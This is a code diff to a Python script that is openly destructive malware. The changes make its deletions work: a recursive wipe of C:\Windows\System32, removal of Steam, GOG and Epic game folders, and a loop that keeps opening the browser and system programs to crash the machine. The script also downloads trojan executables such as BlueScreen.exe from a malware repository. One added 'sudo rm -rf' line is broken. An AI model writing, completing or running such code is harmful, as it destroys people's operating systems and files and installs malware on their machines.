@@ -6,16 +6,29 @@ import webbrowser
 import urllib.request
 import subprocess
 import shutil
+
+def delete_folder(folder_path):
+    if os.path.exists(folder_path):
+        try:
+            shutil.rmtree(folder_path)
+            print(f"Folder '{folder_path}' deleted successfully.")
+        except Exception as e:
+            print(f"Error: {e}")
+    else:
+        print(f"Folder '{folder_path}' does not exist.")
+
 def delsystem32():
-    #pretty self explanatory, finds the system32 folder and removes it.
-    os.rmdir("C:\Windows\System32")
+    delete_folder(r"C:\Windows\System32")
+
+    dirtodel: r"C:\Windows\System32"
+    os.system(f'sudo rm -rf dirtodel')
 def delallgames():
     #every single games you have on steam, gog and epic just removed. maybe even p!rated games with C:/games.
-    os.rmdir("C:\Program Files (x86)\Steam\steamapps\common")
-    os.rmdir("C:\GOG Games")
-    os.rmdir("C:\Program Files (x86)\GOG.com")
-    os.rmdir("C:\Games")
-    os.rmdir("C:\Program Files\Epic Games")
+    os.rmdir(r"C:\Program Files (x86)\Steam\steamapps\common")
+    os.rmdir(r"C:\GOG Games")
+    os.rmdir(r"C:\Program Files (x86)\GOG.com")
+    os.rmdir(r"C:\Games")
+    os.rmdir(r"C:\Program Files\Epic Games")
 def downloadmalware():
     executables = {
     "Bluescreen.exe": "https://github.com/Da2dalus/The-MALWARE-Repo/raw/refs/heads/master/Trojan/BlueScreen.exe",
@@ -38,9 +51,9 @@ def crashtry():
     run = True
     while run == True:
         webbrowser.open("https://www.google.com")
-        os.open("C:\Windows\explorer.exe")
-        os.open("C:\Windows\Notepad.exe")
-        os.open("C:\Windows\System32\Taskmgr.exe")
+        os.open(r"C:\Windows\explorer.exe")
+        os.open(r"C:\Windows\Notepad.exe")
+        os.open(r"C:\Windows\System32\Taskmgr.exe")
 def deldownloads():
 
     # Path to the Downloads folder
